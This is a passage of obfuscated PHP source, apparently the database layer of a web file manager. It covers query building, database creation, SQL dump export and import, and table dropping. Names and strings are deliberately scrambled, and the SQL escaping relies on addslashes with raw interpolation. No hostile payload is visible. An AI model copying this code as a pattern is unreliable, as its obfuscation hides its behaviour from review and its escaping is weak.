return $this->execute($³œàÈ¦, $this->parseBind(!empty($î‘º›Ú[$‚±ûÑÓ[338]]) ? $î‘º›Ú[$‚±ûÑÓ[338]] : array())); } public function selectInsert($³Ù°ÇÄø, $„ú¨œ¤, $áü®„Ã² = array()) { $¹ä´Ó¢ =& $_SERVER[‚ûòÉ˜ş]; $this->model = $áü®„Ã²[$¹ä´Ó¢[334]]; if (is_string($³Ù°ÇÄø)) { $³Ù°ÇÄø = explode($¹ä´Ó¢[60], $³Ù°ÇÄø); } array_walk($³Ù°ÇÄø, array($this, $¹ä´Ó¢[946])); $ÆÖôÒ¼Ø = $¹ä´Ó¢[1081] . $this->parseTable($„ú¨œ¤) . $¹ä´Ó¢[943] . implode($¹ä´Ó¢[60], $³Ù°ÇÄø) . $¹ä´Ó¢[1059]; $ÆÖôÒ¼Ø .= $this->buildSelectSql($áü®„Ã²); return $this->execute($ÆÖôÒ¼Ø, $this->parseBind(!empty($áü®„Ã²[$¹ä´Ó¢[338]]) ? $áü®„Ã²[$¹ä´Ó¢[338]] : array())); } public function update($Ø°İÆû, $ßÓŠš’¶) { $Â¶Šú÷î =& $_SERVER[‚ûòÉ˜ş]; $this->model = $ßÓŠš’¶[$Â¶Šú÷î[334]]; $Ö¬Î½šğ = $Â¶Šú÷î[1082] . $this->parseTable($ßÓŠš’¶[$Â¶Šú÷î[332]]) . $this->parseSet($Ø°İÆû) . $this->parseWhere(!empty($ßÓŠš’¶[$Â¶Šú÷î[328]]) ? $ßÓŠš’¶[$Â¶Šú÷î[328]] : $Â¶Šú÷î[12]) . $this->parseOrder(!empty($ßÓŠš’¶[$Â¶Šú÷î[418]]) ? $ßÓŠš’¶[$Â¶Šú÷î[418]] : $Â¶Šú÷î[12]) . $this->parseLimit(!empty($ßÓŠš’¶[$Â¶Šú÷î[345]]) ? $ßÓŠš’¶[$Â¶Šú÷î[345]] : $Â¶Šú÷î[12]) . $this->parseLock(isset($ßÓŠš’¶[$Â¶Šú÷î[884]]) ? $ßÓŠš’¶[$Â¶Šú÷î[884]] : !1) . $this->parseComment(!empty($ßÓŠš’¶[$Â¶Šú÷î[407]]) ? $ßÓŠš’¶[$Â¶Šú÷î[407]] : $Â¶Šú÷î[12]); return $this->execute($Ö¬Î½šğ, $this->parseBind(!empty($ßÓŠš’¶[$Â¶Šú÷î[338]]) ? $ßÓŠš’¶[$Â¶Šú÷î[338]] : array())); } public function delete($–ú»Çà… = array()) { $ì æé‹ =& $_SERVER[‚ûòÉ˜ş]; $this->model = $–ú»Çà…[$ì æé‹[334]]; $Ç‚çŞØ÷ = $ì æé‹[1083] . $this->parseTable($–ú»Çà…[$ì æé‹[332]]) . $this->parseWhere(!empty($–ú»Çà…[$ì æé‹[328]]) ? $–ú»Çà…[$ì æé‹[328]] : $ì æé‹[12]) . $this->parseOrder(!empty($–ú»Çà…[$ì æé‹[418]]) ? $–ú»Çà…[$ì æé‹[418]] : $ì æé‹[12]) . $this->parseLimit(!empty($–ú»Çà…[$ì æé‹[345]]) ? $–ú»Çà…[$ì æé‹[345]] : $ì æé‹[12]) . $this->parseLock(isset($–ú»Çà…[$ì æé‹[884]]) ? $–ú»Çà…[$ì æé‹[884]] : !1) . $this->parseComment(!empty($–ú»Çà…[$ì æé‹[407]]) ? $–ú»Çà…[$ì æé‹[407]] : $ì æé‹[12]); return $this->execute($Ç‚çŞØ÷, $this->parseBind(!empty($–ú»Çà…[$ì æé‹[338]]) ? $–ú»Çà…[$ì æé‹[338]] : array())); } public function select($Èü›¦í± = array()) { $•áøõñú =& $_SERVER[‚ûòÉ˜ş]; $this->model = $Èü›¦í±[$•áøõñú[334]]; $ÒÁä¯†÷ = $this->buildSelectSql($Èü›¦í±); $îŸªá­© = isset($Èü›¦í±[$•áøõñú[402]]) ? $Èü›¦í±[$•áøõñú[402]] : !1; if ($îŸªá­©) { $Û¿ø…ï½ = is_string($îŸªá­©[$•áøõñú[104]]) ? $îŸªá­©[$•áøõñú[104]] : $•áøõñú[1084] . md5($ÒÁä¯†÷); $¦ìè¤Î  = think_cache($Û¿ø…ï½, $•áøõñú[12], $îŸªá­©); if (!1 !== $¦ìè¤Î ) { return $¦ìè¤Î ; } } $Ÿ„Ö€œ = $this->query($ÒÁä¯†÷, $this->parseBind(!empty($Èü›¦í±[$•áøõñú[338]]) ? $Èü›¦í±[$•áøõñú[338]] : array())); if ($îŸªá­© && !1 !== $Ÿ„Ö€œ) { think_cache($Û¿ø…ï½, $Ÿ„Ö€œ, $îŸªá­©); } return $Ÿ„Ö€œ; } public function buildSelectSql($øóÒÊú€ = array()) { $—¶ïóÏ =& $_SERVER[‚ûòÉ˜ş]; if (isset($øóÒÊú€[$—¶ïóÏ[406]])) { if (strpos($øóÒÊú€[$—¶ïóÏ[406]], $—¶ïóÏ[60])) { list($ƒŒüÒ¢¹, $Üèİº´ˆ) = explode($—¶ïóÏ[60], $øóÒÊú€[$—¶ïóÏ[406]]); } else { $ƒŒüÒ¢¹ = $øóÒÊú€[$—¶ïóÏ[406]]; } $ƒŒüÒ¢¹ = $ƒŒüÒ¢¹ ? $ƒŒüÒ¢¹ : 1; $Üèİº´ˆ = isset($Üèİº´ˆ) ? $Üèİº´ˆ : (is_numeric($øóÒÊú€[$—¶ïóÏ[345]]) ? $øóÒÊú€[$—¶ïóÏ[345]] : 20); $¶÷³°¼ = $Üèİº´ˆ * ((int) $ƒŒüÒ¢¹ - 1); $øóÒÊú€[$—¶ïóÏ[345]] = $¶÷³°¼ . $—¶ïóÏ[60] . $Üèİº´ˆ; } if (think_config($—¶ïóÏ[1085])) { $”‚şË€İ = $—¶ïóÏ[1086] . md5(serialize($øóÒÊú€)); $Úû£ÇıÈ = think_cache($”‚şË€İ); if ($Úû£ÇıÈ) { return $Úû£ÇıÈ; } } $ª³’“¡ö = $this->parseSql($this->selectSql, $øóÒÊú€); $ª³’“¡ö .= $this->parseLock(isset($øóÒÊú€[$—¶ïóÏ[884]]) ? $øóÒÊú€[$—¶ïóÏ[884]] : !1); if (isset($”‚şË€İ)) { think_cache($”‚şË€İ, $ª³’“¡ö); } return $ª³’“¡ö; } public function parseSql($ß·Ø•·ç, $”²…Â‚ç = array()) { $ÂÁÓİÑ =& $_SERVER[‚ûòÉ˜ş]; $ß·Ø•·ç = str_replace(array($ÂÁÓİÑ[1087], $ÂÁÓİÑ[1088], $ÂÁÓİÑ[1089], $ÂÁÓİÑ[1090], $ÂÁÓİÑ[1091], $ÂÁÓİÑ[1092], $ÂÁÓİÑ[1093], $ÂÁÓİÑ[1094], $ÂÁÓİÑ[1095], $ÂÁÓİÑ[1096], $ÂÁÓİÑ[1097]), array($this->parseTable("{$”²…Â‚ç[$ÂÁÓİÑ[332]]}"), $this->parseDistinct(isset($”²…Â‚ç[$ÂÁÓİÑ[1098]]) ? $”²…Â‚ç[$ÂÁÓİÑ[1098]] : !1), $this->parseField(!empty($”²…Â‚ç[$ÂÁÓİÑ[326]]) ? $”²…Â‚ç[$ÂÁÓİÑ[326]] : $ÂÁÓİÑ[213]), $this->parseJoin(!empty($”²…Â‚ç[$ÂÁÓİÑ[335]]) ? $”²…Â‚ç[$ÂÁÓİÑ[335]] : $ÂÁÓİÑ[12]), $this->parseWhere(!empty($”²…Â‚ç[$ÂÁÓİÑ[328]]) ? $”²…Â‚ç[$ÂÁÓİÑ[328]] : $ÂÁÓİÑ[12]), $this->parseGroup(!empty($”²…Â‚ç[$ÂÁÓİÑ[555]]) ? $”²…Â‚ç[$ÂÁÓİÑ[555]] : $ÂÁÓİÑ[12]), $this->parseHaving(!empty($”²…Â‚ç[$ÂÁÓİÑ[1099]]) ? $”²…Â‚ç[$ÂÁÓİÑ[1099]] : $ÂÁÓİÑ[12]), $this->parseOrder(!empty($”²…Â‚ç[$ÂÁÓİÑ[418]]) ? $”²…Â‚ç[$ÂÁÓİÑ[418]] : $ÂÁÓİÑ[12]), $this->parseLimit(!empty($”²…Â‚ç[$ÂÁÓİÑ[345]]) ? $”²…Â‚ç[$ÂÁÓİÑ[345]] : $ÂÁÓİÑ[12]), $this->parseUnion(!empty($”²…Â‚ç[$ÂÁÓİÑ[400]]) ? $”²…Â‚ç[$ÂÁÓİÑ[400]] : $ÂÁÓİÑ[12]), $this->parseComment(!empty($”²…Â‚ç[$ÂÁÓİÑ[407]]) ? $”²…Â‚ç[$ÂÁÓİÑ[407]] : $ÂÁÓİÑ[12])), $ß·Ø•·ç); return $ß·Ø•·ç; } public function getLastSql($Œ©©ÜĞÙ = '') { return $Œ©©ÜĞÙ ? $this->modelSql[$Œ©©ÜĞÙ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¶ïÑà±) { return addslashes($¶ïÑà±); } public function setModel($ë¹°˜ø) { $this->model = $ë¹°˜ø; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ÅÑĞ¼ÎĞ = array()) { $á›—ÃÑ =& $_SERVER[‚ûòÉ˜ş]; if (empty($ÅÑĞ¼ÎĞ)) { $ÅÑĞ¼ÎĞ = $GLOBALS[$á›—ÃÑ[6]][$á›—ÃÑ[31]]; } $this->database = $ÅÑĞ¼ÎĞ; } public function model($¾ ûìòò = '') { return new ModelBase($¾ ûìòò, $_SERVER[‚ûòÉ˜ş][12], $this->database); } public function db($÷¼çûÂ‰ = false) { $‰Ø¹Ï¸ =& $_SERVER[‚ûòÉ˜ş]; $ÏÂ“Ó°• = array_change_key_case($this->database); if ($this->dbType() == $‰Ø¹Ï¸[23] || !$÷¼çûÂ‰) { return $this->model()->db(); } $ÜıíÚ = $ÏÂ“Ó°•[$‰Ø¹Ï¸[1013]]; $ÏÂ“Ó°•[$‰Ø¹Ï¸[1013]] = $‰Ø¹Ï¸[12]; if ($ÏÂ“Ó°•[$‰Ø¹Ï¸[1008]] == $‰Ø¹Ï¸[1005]) { $¾¾ğøè = $ÏÂ“Ó°•[$‰Ø¹Ï¸[1014]]; $ÏÂ“Ó°•[$‰Ø¹Ï¸[1014]] = substr($¾¾ğøè, 0, strrpos($¾¾ğøè, $‰Ø¹Ï¸[1100])); } $this->database = $ÏÂ“Ó°•; $ÆßŠÙÅÙ = $this->model()->db(); try { $­¼êìÃ = $ÆßŠÙÅÙ->execute("\163\x68\x6f\x77\x20\x64\141\164\x61\x62\x61\163\145\x73\40\154\x69\x6b\x65\x20\47{$ÜıíÚ}\47"); } catch (Exception $ÄÙßÇé) { } if (!$­¼êìÃ) { $ÆßŠÙÅÙ->execute("\x63\x72\x65\x61\x74\x65\x20\x64\141\x74\141\142\x61\163\x65\40\x60{$ÜıíÚ}\140"); } $ÏÂ“Ó°•[$‰Ø¹Ï¸[1013]] = $ÜıíÚ; if ($ÏÂ“Ó°•[$‰Ø¹Ï¸[1008]] == $‰Ø¹Ï¸[1005]) { $ÏÂ“Ó°•[$‰Ø¹Ï¸[1014]] .= $‰Ø¹Ï¸[1100] . $ÜıíÚ; } $this->database = $ÏÂ“Ó°•; $ÆßŠÙÅÙ->execute("\165\x73\145\x20\x60{$ÜıíÚ}\x60"); return $ÆßŠÙÅÙ; } public function createTable($Á°›“ÃÍ, &$¶éÀÙ£) { $—ÁğèŞ =& $_SERVER[‚ûòÉ˜ş]; if (!IO::exist($Á°›“ÃÍ)) { ActionCall($—ÁğèŞ[1101], !0, 0); show_json(LNG($—ÁğèŞ[1102]), !1); } $¨­úŸ€ñ = $this->model()->db(); $¿Ø•ş§Ô = sqlSplit(IO::getContent($Á°›“ÃÍ)); foreach ($¿Ø•ş§Ô as $Ô½â•‚ü) { $ŒƒÚÓâ“ = stripos($Ô½â•‚ü, $—ÁğèŞ[1103]) === 0; if ($ŒƒÚÓâ“) { $¶éÀÙ£->task[$—ÁğèŞ[826]] += 1; } $¨­úŸ€ñ->execute($Ô½â•‚ü); if ($ŒƒÚÓâ“) { preg_match($—ÁğèŞ[1104], $Ô½â•‚ü, $ù˜…Á»); $¶éÀÙ£->task[$—ÁğèŞ[1105]] = $ù˜…Á»[1]; $¶éÀÙ£->update(1); } } } public function insertTable($Á ®¨¤Š, &$…’×Òø“) { $øÚáÍ¸„ =& $_SERVER[‚ûòÉ˜ş]; $‚Ş››Èø = $this->model()->db(); $Ó»îöŒÖ = $›º‡•Ï¯ ? array($›º‡•Ï¯) : $‚Ş››Èø->getTables(); foreach ($Á ®¨¤Š as $°Şà…Ø) { $›º‡•Ï¯ = basename($°Şà…Ø, $øÚáÍ¸„[828]); if (!in_array($›º‡•Ï¯, $Ó»îöŒÖ)) { continue; } $…’×Òø“->task[$øÚáÍ¸„[1105]] = $›º‡•Ï¯; if (get_filesize($°Şà…Ø) == 0) { continue; } $­Œ¡ïıÛ = $this->sqlToDb($°Şà…Ø, $…’×Òø“); if (!$­Œ¡ïıÛ) { ActionCall($øÚáÍ¸„[1101], !0, 0); show_json(LNG($øÚáÍ¸„[1106]) . "\x5b{$›º‡•Ï¯}\x5d", !1); } } } public function sqlFromDb($³¸Ş‹Ûè, $¼ç¥•ƒ×, &$ıµ•Ùˆ, $êˆØ¯Œ– = '') { if ($ıµ•Ùˆ) { $ıµ•Ùˆ->task[$_SERVER[‚ûòÉ˜ş][1105]] = $³¸Ş‹Ûè; } $Ó¢ªÏĞ = $this->model($³¸Ş‹Ûè); $¡ş’º° = 0; $ÇÁòıæ = 0; $ÅĞÎ³µ = 10000; $¬óŞò›Û = fopen($¼ç¥•ƒ×, $_SERVER[‚ûòÉ˜ş][1107]); $úÍ«âÇû = $Ó¢ªÏĞ->getPk(); $…öçÃîù = $Ó¢ªÏĞ->getDbFields(); $¼¤ˆåü = $_SERVER[‚ûòÉ˜ş][12]; if ($GLOBALS[$_SERVER[‚ûòÉ˜ş][827]] && in_array($³¸Ş‹Ûè, array($_SERVER[‚ûòÉ˜ş][1108], $_SERVER[‚ûòÉ˜ş][1109]))) { $¼¤ˆåü = $³¸Ş‹Ûè; } do { $ÄÇ°Ğ¾Ø = array($úÍ«âÇû => array($_SERVER[‚ûòÉ˜ş][1055], $ÇÁòıæ)); $„ §ËóÒ = $Ó¢ªÏĞ->where($ÄÇ°Ğ¾Ø)->field($…öçÃîù)->order($úÍ«âÇû . $_SERVER[‚ûòÉ˜ş][1110])->limit($ÅĞÎ³µ)->select(); $„ §ËóÒ = !empty($„ §ËóÒ) ? $„ §ËóÒ : array(); if (!($µå¯ÚÄ = count($„ §ËóÒ))) { break; } $ñâÛ¨îÒ = end($„ §ËóÒ); $ÇÁòıæ = $ñâÛ¨îÒ[$úÍ«âÇû]; $…À×è ê = array(); foreach ($„ §ËóÒ as $‡†¼ô©) { if ($¼¤ˆåü) { if ($³¸Ş‹Ûè == $_SERVER[‚ûòÉ˜ş][1108]) { if ($‡†¼ô©[$_SERVER[‚ûòÉ˜ş][43]] == $_SERVER[‚ûòÉ˜ş][1111]) { $£ô§Á‹‚ = json_decode($‡†¼ô©[$_SERVER[‚ûòÉ˜ş][427]], !0); if ($£ô§Á‹‚[$_SERVER[‚ûòÉ˜ş][42]] == $GLOBALS[$_SERVER[‚ûòÉ˜ş][827]] && $£ô§Á‹‚[$_SERVER[‚ûòÉ˜ş][790]] != 1) { continue; } } } else { if ($‡†¼ô©[$_SERVER[‚ûòÉ˜ş][43]] == $_SERVER[‚ûòÉ˜ş][1112] && $‡†¼ô©[$_SERVER[‚ûòÉ˜ş][104]] == $_SERVER[‚ûòÉ˜ş][819]) { continue; } } } if ($êˆØ¯Œ–) { $‡†¼ô©[$_SERVER[‚ûòÉ˜ş][94]] = "\173\151\157\x3a{$êˆØ¯Œ–}\175" . substr($‡†¼ô©[$_SERVER[‚ûòÉ˜ş][94]], strlen("\173\151\157\72{$‡†¼ô©[$_SERVER[‚ûòÉ˜ş][857]]}\x7d")); $‡†¼ô©[$_SERVER[‚ûòÉ˜ş][857]] = $êˆØ¯Œ–; } $…À×è ê[] = $_SERVER[‚ûòÉ˜ş][1113] . $this->sqlEncode($‡†¼ô©) . $_SERVER[‚ûòÉ˜ş][1114]; } $ éªéğ– = "\x49\x4e\123\x45\122\x54\40\x49\116\x54\x4f\40\140{$³¸Ş‹Ûè}\140\40\x28\140" . implode($_SERVER[‚ûòÉ˜ş][1115], $…öçÃîù) . $_SERVER[‚ûòÉ˜ş][1116]; fwrite($¬óŞò›Û, $ éªéğ– . implode($_SERVER[‚ûòÉ˜ş][1117], $…À×è ê) . $_SERVER[‚ûòÉ˜ş][81] . PHP_EOL); $¡ş’º° += $µå¯ÚÄ; if ($ıµ•Ùˆ) { $ıµ•Ùˆ->update($µå¯ÚÄ); } } while ($ÅĞÎ³µ == $µå¯ÚÄ); fclose($¬óŞò›Û); return $¡ş’º°; } public function sqlToDb($Îâ»´Ş, &$ş‡ã) { $ºÀØßĞ— =& $_SERVER[‚ûòÉ˜ş]; $ÛùŸÀÊÈ = $this->model()->db(); $Ñ§¸ôÎ® = @fopen($Îâ»´Ş, $ºÀØßĞ—[1118]); if (!$Ñ§¸ôÎ®) { return !1; } $™®¥­ = 0; $º¡Ïû‹İ = $ºÀØßĞ—[12]; $İãƒèÅÒ = array(); $šøè®Õº = $this->dbType(); $æëÈæŠí = $šøè®Õº == $ºÀØßĞ—[23] ? 500 : 2000; $ÛœµâúÆ = basename($Îâ»´Ş, $ºÀØßĞ—[828]); $¨É„Í“Í = 0; $å¢ØÆÔğ = 4194304 - 104858; $äËÇËª = 1000000 - 104858; while (!feof($Ñ§¸ôÎ®)) { $ü«¯ÎÅ÷ = trim(fgets($Ñ§¸ôÎ®)); if (!$ü«¯ÎÅ÷) { continue; } $¯„ì”âØ = $this->sqlDecode($ü«¯ÎÅ÷, $šøè®Õº, $ÛœµâúÆ); if (stripos($¯„ì”âØ, $ºÀØßĞ—[408]) === 0) { if (!$º¡Ïû‹İ) { $º¡Ïû‹İ = $¯„ì”âØ . $ºÀØßĞ—[63]; } continue; } if ($ş‡ã) { $ş‡ã->task[$ºÀØßĞ—[826]] += 1; } $™®¥­++; $İãƒèÅÒ[] = rtrim(rtrim(trim($¯„ì”âØ), $ºÀØßĞ—[60]), $ºÀØßĞ—[81]); $àµåÄ‚ = null; $Óëğ‡È³ = strlen($¯„ì”âØ); $¨É„Í“Í += $Óëğ‡È³; if ($¨É„Í“Í >= ($æëÈæŠí == 500 ? $äËÇËª : $å¢ØÆÔğ)) { $àµåÄ‚ = array_pop($İãƒèÅÒ); if ($™®¥­ > 1) { $™®¥­--; } } if ($™®¥­ >= $æëÈæŠí || $àµåÄ‚) { $¯„ì”âØ = $º¡Ïû‹İ . implode($ºÀØßĞ—[60], $İãƒèÅÒ); if (!$ÛùŸÀÊÈ->execute($¯„ì”âØ)) { return !1; } if ($ş‡ã) { $ş‡ã->update($™®¥­); } $İãƒèÅÒ = array(); $™®¥­ = 0; $¨É„Í“Í = 0; if ($àµåÄ‚) { $İãƒèÅÒ = array($àµåÄ‚); $™®¥­ = 1; $¨É„Í“Í = $Óëğ‡È³; } } } fclose($Ñ§¸ôÎ®); if (!empty($İãƒèÅÒ)) { $¯„ì”âØ = $º¡Ïû‹İ . implode($ºÀØßĞ—[60], $İãƒèÅÒ); if (!$ÛùŸÀÊÈ->execute($¯„ì”âØ)) { return !1; } if ($ş‡ã) { $ş‡ã->update($™®¥­); } } return !0; } public function dropTable($í´›Ç¿ = null) { $¶Ìû€­¤ = $this->model()->db(); $íŒ©ÙĞ¬ = $í´›Ç¿ ? array($í´›Ç¿) : $¶Ìû€­¤->getTables(); if (!$íŒ©ÙĞ¬) { return; } foreach ($íŒ©ÙĞ¬ as $í´›Ç¿) { if ($í´›Ç¿) { $í´›Ç¿ = strtolower($í´›Ç¿); } else { continue; } $¶Ìû€­¤->execute("\x64\x72\x6f\x70\x20\x74\141\142\154\x65\x20\x69\146\x20\x65\x78\151\163\164\163\x20\140{$í´›Ç¿}\140"); } } private function sqlEncode($èÔñôØö) { $ÃÂ”« =& $_SERVER[‚ûòÉ˜ş]; $ÍŠÙ—Ğ = array(); foreach ($èÔñôØö as $š—–Îç) { if (is_array($š—–Îç)) { $š—–Îç = json_encode_force($š—–Îç); } $š—–Îç = addslashes($š—–Îç); $š—–Îç = str_replace(array($ÃÂ”«[1119], $ÃÂ”«[18]), array($ÃÂ”«[1120], $ÃÂ”«[1121]), $š—–Îç); $ÍŠÙ—Ğ[] = str_replace($ÃÂ”«[68], $ÃÂ”«[1122], $š—–Îç); } return $ÃÂ”«[68] . implode($ÃÂ”«[1123], $ÍŠÙ—Ğ) . $ÃÂ”«[68]; } private function sqlDecode($Ö›“øœá, $î¯˜ĞĞú, $°ÇĞíëî = '') { $çùé€¾ =& $_SERVER[‚ûòÉ˜ş]; $Ö›“øœá = str_replace(array($çùé€¾[1120], $çùé€¾[1121]), array($çùé€¾[1119], $çùé€¾[18]), $Ö›“øœá); if ($î¯˜ĞĞú == $çùé€¾[23]) { return $°ÇĞíëî != $çùé€¾[1124] ? stripslashes($Ö›“øœá) : $Ö›“øœá; } if ($°ÇĞíëî == $çùé€¾[1124]) { $Ö›“øœá = str_replace($çùé€¾[1125], $çùé€¾[128], stripslashes($Ö›“øœá)); } return $Ö›“øœá; } public function getSqlFile($—’×¨‘Ö = '') { $ÃÅ•¨»² =& $_SERVER[‚ûòÉ˜ş]; $×öÃãÏê = $this->dbType(!0); $İ¯ğ¨Ó¥ = CONTROLLER_DIR . "\151\x6e\163\x74\x61\154\154\x2f\144\x61\x74\141\57{$×öÃãÏê}\56\163\161\x6c"; $ÊÍ›‰üÔ = file_get_contents($İ¯ğ¨Ó¥); $®Ú‡ÍÏş = $ÃÅ•¨»²[1126] . ($×öÃãÏê == $ÃÅ•¨»²[844] ? $ÃÅ•¨»²[1127] : $ÃÅ•¨»²[1128]) . $ÃÅ•¨»²[1129]; preg_match_all($®Ú‡ÍÏş, $ÊÍ›‰üÔ, $Ïåİë¨«); $ÜÍ£Ô°È = $Ïåİë¨«[1]; $›‹°÷ë = $this->model()->db(); $‡™×¡Ş‚ = $›‹°÷ë->getTables(); $ùÚåÚÂÄ = TEMP_FILES . $ÃÅ•¨»²[1130] . date($ÃÅ•¨»²[264]) . $ÃÅ•¨»²[8]; del_dir($ùÚåÚÂÄ); mk_dir($ùÚåÚÂÄ); $ÛéÇ±ı = $ùÚåÚÂÄ . $ÃÅ•¨»²[1131]; $Ø¡ÛµÎÃ = $ùÚåÚÂÄ . $ÃÅ•¨»²[1132]; $¦€¬ó¥” = $×öÃãÏê == $ÃÅ•¨»²[23] ? $ÃÅ•¨»²[844] : $ÃÅ•¨»²[23]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\164\x61\x6c\x6c\57\144\x61\x74\x61\x2f{$¦€¬ó¥”}\56\x73\161\154", $ùÚåÚÂÄ); @touch($ùÚåÚÂÄ . $×öÃãÏê . $ÃÅ•¨»²[828]); $îÍİì¼å = fopen($ÛéÇ±ı, $ÃÅ•¨»²[1107]); $æ›ç™» = fopen($Ø¡ÛµÎÃ, $ÃÅ•¨»²[1107]); if ($×öÃãÏê == $ÃÅ•¨»²[23]) { $‡™×¡Ş‚ = array_diff($‡™×¡Ş‚, array($ÃÅ•¨»²[824], $ÃÅ•¨»²[825])); $ß¬ğªŞ× = array($ÃÅ•¨»²[1133], $ÃÅ•¨»²[1134], $ÃÅ•¨»²[1135]); fwrite($æ›ç™», implode(PHP_EOL, $ß¬ğªŞ×) . PHP_EOL . PHP_EOL); foreach ($‡™×¡Ş‚ as $áÚı¢££) { $¥Ş¼¨¼¼ = $this->sqlFromSqlite($áÚı¢££); if (!$¥Ş¼¨¼¼[$ÃÅ•¨»²[23]]) { continue; } fwrite($æ›ç™», $¥Ş¼¨¼¼[$ÃÅ•¨»²[23]] . PHP_EOL . PHP_EOL); if (!in_array($áÚı¢££, $ÜÍ£Ô°È)) { fwrite($îÍİì¼å, $¥Ş¼¨¼¼[$ÃÅ•¨»²[844]] . PHP_EOL . PHP_EOL); } } } else { foreach ($‡™×¡Ş‚ as $áÚı¢££) { $¥Ş¼¨¼¼ = $this->sqlFromMysql($áÚı¢££); if (!$¥Ş¼¨¼¼[$ÃÅ•¨»²[844]]) { continue; } fwrite($îÍİì¼å, $¥Ş¼¨¼¼[$ÃÅ•¨»²[844]] . PHP_EOL . PHP_EOL); if (!in_array($áÚı¢££, $ÜÍ£Ô°È)) { fwrite($æ›ç™», $¥Ş¼¨¼¼[$ÃÅ•¨»²[23]] . PHP_EOL . PHP_EOL); } } } fclose($îÍİì¼å); fclose($æ›ç™»); $ÊÍ›‰üÔ = array($ÃÅ•¨»²[844] => $ÛéÇ±ı, $ÃÅ•¨»²[23] => $Ø¡ÛµÎÃ); return $—’×¨‘Ö ? $ÊÍ›‰üÔ[$—’×¨‘Ö] : $ÊÍ›‰üÔ; } public function dbType($‹¨½×§Š = false) { $êÄô“ûë =& $_SERVER[‚ûòÉ˜ş]; $ÉƒëŒ­« = $‹¨½×§Š ? $GLOBALS[$êÄô“ûë[6]][$êÄô“ûë[31]] : $this->database; $ÉƒëŒ­« = array_change_key_case($ÉƒëŒ­«); $ùğ¬Óª§ = $ÉƒëŒ­«[$êÄô“ûë[1008]]; if ($ùğ¬Óª§ == $êÄô“ûë[1005]) { $ó‹Â‹¾½ = explode($êÄô“ûë[4], $ÉƒëŒ­«[$êÄô“ûë[1014]]); $ùğ¬Óª§ = $ó‹Â‹¾½[0]; } $®Ÿ¬­ò = array($êÄô“ûë[1136] => $êÄô“ûë[23], $êÄô“ûë[953] => $êÄô“ûë[844]); if (isset($®Ÿ¬­ò[$ùğ¬Óª§])) { $ùğ¬Óª§ = $®Ÿ¬­ò[$ùğ¬Óª§]; } return $ùğ¬Óª§; } public function sqlFromMysql($‡•æòÕÂ, $²™áÉØ = '') { $íÃ‘æáÛ =& $_SERVER[‚ûòÉ˜ş]; $˜¾Ìëü– = $this->model()->db(); $ÇšòîŸé = $˜¾Ìëü–->query($íÃ‘æáÛ[1137] . $‡•æòÕÂ . $íÃ‘æáÛ[437]); if (!$ÇšòîŸé || !$ÇšòîŸé[0]) { return !1; } $ôñŒ–÷‹ = _get($ÇšòîŸé[0], $íÃ‘æáÛ[1138], $íÃ‘æáÛ[12]); if (!$ôñŒ–÷‹) { return !1; } $£äÙë• = "\x44\122\x4f\x50\x20\x54\x41\x42\x4c\x45\x20\x49\106\40\x45\130\111\123\x54\123\x20\140{$‡•æòÕÂ}\140\x3b" . PHP_EOL . $ôñŒ–÷‹ . $íÃ‘æáÛ[81]; if ($²™áÉØ && $²™áÉØ == $íÃ‘æáÛ[844]) { return $£äÙë•; } $òŸå°­© = array_change_key_case($GLOBALS[$íÃ‘æáÛ[6]][$íÃ‘æáÛ[31]]); $Ÿö¸Œ´› = $òŸå°­©[$íÃ‘æáÛ[1013]]; $Í‹€¥¦­ = $íÃ‘æáÛ[1139] . $Ÿö¸Œ´› . $íÃ‘æáÛ[1140] . $‡•æòÕÂ . $íÃ‘æáÛ[68]; $ÒÂƒÍŒ’ = $íÃ‘æáÛ[1141] . $‡•æòÕÂ . $íÃ‘æáÛ[940]; $”ú·ì = $˜¾Ìëü–->query($Í‹€¥¦­); if (empty($”ú·ì)) { $¾Œ»Ÿ¿ = array($íÃ‘æáÛ[844] => $íÃ‘æáÛ[12], $íÃ‘æáÛ[23] => $íÃ‘æáÛ[12]); return $²™áÉØ ? $¾Œ»Ÿ¿[$²™áÉØ] : $¾Œ»Ÿ¿; } $Öº¤ªô = $˜¾Ìëü–->query($ÒÂƒÍŒ’); $…»Œ Á£ = $íÃ‘æáÛ[12]; $ãÁòÁ•í = array(); foreach ($Öº¤ªô as $¿…µİ¨Ì) { if (!$…»Œ Á£ && $¿…µİ¨Ì[$íÃ‘æáÛ[1142]] == $íÃ‘æáÛ[1143]) { $…»Œ Á£ = $¿…µİ¨Ì[$íÃ‘æáÛ[1144]]; } if (isset($ãÁòÁ•í[$¿…µİ¨Ì[$íÃ‘æáÛ[1142]]])) { $ãÁòÁ•í[$¿…µİ¨Ì[$íÃ‘æáÛ[1142]]][$íÃ‘æáÛ[1145]][] = $¿…µİ¨Ì[$íÃ‘æáÛ[1144]]; continue; } $ãÁòÁ•í[$¿…µİ¨Ì[$íÃ‘æáÛ[1142]]] = array($íÃ‘æáÛ[1146] => $¿…µİ¨Ì[$íÃ‘æáÛ[1142]], $íÃ‘æáÛ[1145] => array($¿…µİ¨Ì[$íÃ‘æáÛ[1144]]), $íÃ‘æáÛ[1147] => $¿…µİ¨Ì[$íÃ‘æáÛ[1148]] == $íÃ‘æáÛ[98] ? 0 : 1); } $ØÈúÆ×´ = array(); foreach ($ãÁòÁ•í as $¿…µİ¨Ì) { $ĞÓôĞ­ = $¿…µİ¨Ì[$íÃ‘æáÛ[1146]] == $íÃ‘æáÛ[1143]; $£İµŞ€ = array($íÃ‘æáÛ[1149], $¿…µİ¨Ì[$íÃ‘æáÛ[1147]] == $íÃ‘æáÛ[98] && !$ĞÓôĞ­ ? $íÃ‘æáÛ[1150] : $íÃ‘æáÛ[12], $íÃ‘æáÛ[1151], $íÃ‘æáÛ[1152] . $‡•æòÕÂ . $íÃ‘æáÛ[11] . ($ĞÓôĞ­ ? $íÃ‘æáÛ[1153] : $¿…µİ¨Ì[$íÃ‘æáÛ[1146]]) . $íÃ‘æáÛ[128], $íÃ‘æáÛ[1154], $íÃ‘æáÛ[128] . $‡•æòÕÂ . $íÃ‘æáÛ[128], $íÃ‘æáÛ[1155] . implode($íÃ‘æáÛ[1156], $¿…µİ¨Ì[$íÃ‘æáÛ[1145]]) . $íÃ‘æáÛ[1157]); $ØÈúÆ×´[] = implode($íÃ‘æáÛ[63], $£İµŞ€) . $íÃ‘æáÛ[81]; } 